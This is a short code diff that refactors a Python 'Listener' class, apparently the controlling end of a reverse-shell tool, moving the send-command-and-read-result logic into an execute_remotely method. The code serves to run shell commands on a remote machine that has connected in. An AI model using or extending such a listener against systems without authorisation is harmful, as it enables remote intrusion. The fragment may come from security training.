@@ -13,12 +13,15 @@ class Listener:
         self.con, address = listener.accept()
         print(f"[+] Connected with {str(address[0])}")
 
+    def execute_remotely(self, command):
+        self.con.send(command.encode())
+        return self.con.recv(1024).decode()
+
 
     def run(self):
         while True:
             command = input(">> ")
-            self.con.send(command.encode())
-            result = self.con.recv(1024).decode()
+            result = self.execute_remotely(command)
             print(result)
 
 
